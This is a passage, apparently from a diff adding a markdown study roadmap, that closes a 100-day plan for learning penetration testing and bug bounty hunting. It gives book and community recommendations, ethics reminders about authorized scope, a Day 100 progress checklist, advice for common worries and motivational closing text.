+- "The Hacker Playbook 3" - Peter Kim (pentesting)
+- "RTFM: Red Team Field Manual" - Ben Clark (reference)
+
+---
+
+## Emergency Contacts & Support
+
+### **When You Need Help**
+
+**Technical Questions:**
+- TryHackMe Discord - Specific room help
+- HackTheBox Forums - No spoilers for active machines
+- r/AskNetsec - General security questions
+- InfoSec Prep Discord - Community support
+
+**Mental Health & Burnout:**
+- Take breaks without guilt
+- Remember: This is a marathon, not a sprint
+- Imposter syndrome is normal and temporary
+- Your worth ≠ your bug bounty acceptances
+
+**Ethical Concerns:**
+- When in doubt about legality: DON'T TEST
+- Read program policies carefully
+- NEVER test outside authorized scope
+- If unsure, ask program before testing
+
+**Career Advice:**
+- r/cybersecurity Career Megathread
+- LinkedIn cybersecurity groups
+- Local BSides/OWASP chapters
+- Security meetups (meetup.com)
+
+---
+
+## Final Checklist - Day 100 Review
+
+### **Technical Achievements**
+- [ ] Completed 25+ labs/boxes
+- [ ] Submitted 3+ bug reports
+- [ ] Proficient in Burp Suite/web testing
+- [ ] Can perform basic privilege escalation
+- [ ] Understanding of OWASP Top 10
+- [ ] Created custom tools/scripts
+- [ ] 50+ PortSwigger Academy labs
+
+### **Portfolio Completeness**
+- [ ] GitHub profile professional and organized
+- [ ] 10+ detailed writeups published
+- [ ] Resume tailored for junior pentester roles
+- [ ] LinkedIn profile updated
+- [ ] At least 1 blog post published
+- [ ] Professional bio written
+- [ ] Contact information accessible
+
+### **Soft Skills**
+- [ ] Can explain technical concepts clearly
+- [ ] Write professional reports
+- [ ] Comfortable with responsible disclosure process
+- [ ] Engaged with cybersecurity community
+- [ ] Developed consistent study habits
+- [ ] Created sustainable learning routine
+
+### **Career Readiness**
+- [ ] Resume ready to send
+- [ ] Portfolio link-ready
+- [ ] Interview talking points prepared
+- [ ] Applied to 3+ junior positions (or ready to)
+- [ ] Clear 6-month plan created
+- [ ] Identified specialization interest
+
+### **Mindset & Habits**
+- [ ] Comfortable with being stuck and problem-solving
+- [ ] Documentation is automatic habit
+- [ ] Can maintain focus for 2+ hours
+- [ ] Weekly retrospectives in place
+- [ ] Healthy relationship with breaks
+- [ ] Excited about continuous learning
+
+---
+
+## Troubleshooting Common Concerns
+
+### **"I'm behind schedule"**
+✅ **Solution:** This is normal. Focus on understanding over speed.
+- Adjust roadmap: extend weeks that need more time
+- Quality > quantity: better to master one topic than rush three
+- Some people need 120-150 days - that's perfectly fine
+
+### **"I haven't found any bugs yet"**
+✅ **Solution:** Bug bounty success takes time.
+- Average is 3-6 months before first acceptance
+- Focus on less-tested assets (APIs, mobile, docs sites)
+- Lower expectations: info/low severity is still success
+- Consider VDP programs for learning without pressure
+
+### **"I'm not smart enough for this"**
+✅ **Solution:** This is imposter syndrome, not reality.
+- Everyone feels this way starting out
+- Skills are built, not innate
+- You've already learned complex topics (Linux, TCP/IP, programming)
+- Review Day 1 vs. Day 100 - you've grown enormously
+
+### **"I can't afford paid platforms"**
+✅ **Solution:** Free resources are abundant.
+- PortSwigger Academy (completely free, world-class)
+- TryHackMe free rooms (substantial content)
+- VulnHub (free VMs)
+- OWASP apps (free)
+- HTB free tier + retired machines
+- YouTube walkthroughs (IppSec, John Hammond)
+
+### **"Should I start applying for jobs?"**
+✅ **Decision Matrix:**
+
+**Apply NOW if:**
+- Portfolio has 8+ quality writeups
+- You're comfortable explaining OWASP Top 10
+- Resume demonstrates hands-on practice
+- You can discuss your learning journey confidently
+
+**Wait a bit if:**
+- Portfolio feels empty (<5 writeups)
+- You struggle to explain basic concepts
+- Haven't completed any full assessments
+- Still very uncomfortable with testing methodology
+
+**Remember:** Some companies hire for potential + enthusiasm over experience.
+
+---
+
+## Your Daily Mantra (Save This)
+
+**Print this. Put it above your desk. Read it daily.**
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│                                                             │
+│  "I am building expertise one hour at a time.              │
+│   Every enumeration teaches me. Every failure sharpens me. │
+│   I am becoming the pentester I will be proud to be."      │
+│                                                             │
+│  Today's focus: [WRITE YOUR SINGLE GOAL HERE]             │
+│                                                             │
+│  Consistency beats intensity. Progress beats perfection.    │
+│  I document, therefore I grow.                             │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Closing Motivation
+
+You are about to embark on a transformative journey. In 100 days, you won't just have new skills—you'll have a new way of seeing technology, understanding systems, and solving problems. 
+
+The path will be challenging. You'll feel stuck. You'll feel stupid. You'll question whether you're cut out for this. **These feelings are not stop signs—they're mile markers on the road to mastery.**
+
+Every expert pentester you admire started exactly where you are now: confused, overwhelmed, and uncertain. The only difference between them and you is **they kept showing up.** They documented their confusion. They practiced through frustration. They submitted reports despite fear of rejection.
+
+This roadmap is your guide, not your prison. Adjust it as needed. Take breaks when necessary. Celebrate small wins. Help others when you can. Build in public. Share your journey.
+
+**100 days from now, you won't be perfect. But you'll be formidable.**
+
+Now close this document, open Day 1's tasks, and begin.
+
+Your future self is counting on you to start today.
+
+---
+
+**🚀 Begin Day 1 now. Document everything. Trust the process. You've got this.**
+
+---
+
+*Remember: The best time to start was yesterday. The second best time is now. Stop reading. Start doing. Day 1 awaits.*
